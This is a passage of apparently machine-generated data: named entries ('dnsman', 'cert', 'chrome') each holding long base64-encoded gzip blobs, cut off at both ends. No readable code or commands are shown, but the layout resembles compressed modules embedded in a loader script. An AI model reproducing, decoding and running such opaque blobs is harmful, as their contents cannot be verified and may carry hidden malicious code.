z99/9Fsm23L8OfhfZDw3n9E//puvlyExRN7mmGsPu9yX6a5b/chT9NK3Qb6X6Zr/rc6HuvjV0sNRbTnfdt236438A/svXv++6P/8zb7++f83e/4j0nzK//04ejrHN/8pf/zxM/gDvm9//BZbNqw3uIwAA"
    "dnsman" = "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"
    "cert" = "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"
    "chrome" = "H4sIAAAAAAAACo1VWW+jShZ+j+T/gHrykIjuYBvHS6Q8YLAxNmBsdve0RizFvhbF5qv+7yPHiTp3riPNeYBS1Tnf+b5zarlfZU7uAld2YFgg7BX7tplUHPVudDHSTJ2wxYBZ2BVDTCxq7VCiGgVDw5Br/0AJM93ejeUD9bwxTx3LRsV2yQZgWTw76W5IgDmzdVON6hfMiSR70miaTZaQw3ShC6ZlPC8DVtbZohPXrbBsnb19hEii9mSOs35PMJRKt8e6UlOZpiebY49n+RwoOjiz1DQcW+epaEitU7Haul7kwjGqY7rM1l2hcAInlLE7i1ViN6pnhNrZ+A72K7QnC1wqpmcv6r0IWe5SwsfyLrXakUuwtDwjVxXayYI14/Y8Z8ilsDmHQrBh1erIrTXOXXczU87DuOSqI1VIx0AUgtEsUKdVVZaqC4V2lizcLavIp34z6dc20KwkJpmFTzpKDSV75cN0p8SzKbEVtLka89NSMfv6gIfcEkU2yVFouFBnekOmCq4u+oDUpg7cJmFS2CTdRPk5a5ts7+iZJkJphfjTacbzGsMrR2Zpb7jWcyzh5Bj4wp8wSQlXBrRKw9zUftr3s2koLrvNfK57Bpvh+tH1VGqiLIi1FGauOlOyeY5mMZCgGOMUPQ49t9V3k1Y5GVumTQiFME1aK8Cqzs7d2EuTcVlbgU37zwkXEaujj2/8MUm1wF94pvqcRiez4bdGACdTwcDhuNdLpaI5ZueRmh21Q7wdHriJa0R7HRWHHNk9PU+0jnKkLJhMXa7jiU1PiJKZPNvhxM5OYihHxXodbSy0yo6hqbVh3PJraMv9cWVDyg+bkxkfsmVNzMbOaIjzqZAzbbU4jNrqYM9LXdJDx3PEverxDpSDmJC5JkzgcbdmYEeP2Fp1WtvjmaRsOxBwpmmE56MD0MwgpAnYIIGYNWyAWzl5ZL2Ewm2lWhv1Ln5udtORnWceQhoeU2S7mrdIjm2fqldAXEwbM/a32THuJjuxJ9hWyopTzpPa/iQnIp6sTo1I9eRoBFecWYrjQ7cQ94FQaFwX0GgLKp/ha8MmAhKeeEDOdx1NTDfhROvEcT1M5r02I93Mt7fV6HnoxRCVmYAT7HnReHtcLUaNtiSIQk6c5+V+2B5WXKqSCRL0odEq+Iw7zvcE1zrPp0JXw0WrAW9jdEXjQYPRaVFfCbYIFuTSZfgCl+YUHKblgaY2FEW9fhvc3cNIBG10MDVZPCvcsgIqKLBX7CedZw2A6NfLyxrm6dKqwHQiIxhm/sP93y6ex8Hd4O4+2htN5fWCxx6lSOV9zwTtdoe9YiJof+ztCDgIk/sKgfSJ2z8JIM1hLyMIrPTh+00Oj4O7e3G99owo8ERvnyy3ncs4QfUVJJ2nBQRVFebZE3sOi3fwL4h9x37eDv00FnIX/Hp5YYDzPndVyilh0dCNHtH7mO+PQLfX2v+j8ws9T3Re9Er+cBP3PaOVqjttWdeoVqst75wkboO9YjcjnpScgtDqHy71E8wAJXEpKL3UM0sp8y+NfWengA49vTUyzPxfLy+qsp4/sQB99PhW0isdIZLKpWpaHlvIu4juwSovy5sVeMtxBVzWYeICOLj72eSh++s2yBNVFCBzH/5J/JrZzZvCTD2kcmiZl40B4rOoZ5dS3IZT8nc1b+GDO6/OHBTmGcZxnhVBQzx6QQr9TAog9R8P+2twh2EYdp+AyGoV3j+cGjU8oO328rbSL/92gV37T6hD366O1y+C/Ufkxf6F0QFwYiz0MBQAzAsTgIEurFD1xyf0sAcFVOiHZKHgVr63BaUvAMYDy3v8jH8xCFANM+wewRr8WfmNgaQCX/l6VlJ9dr4Of2OOhZzgfwS8TVlZjwEIc1hhKLAQljtODTG3vhT0TdofBXkBoHUp7B+UG2l/D+5+X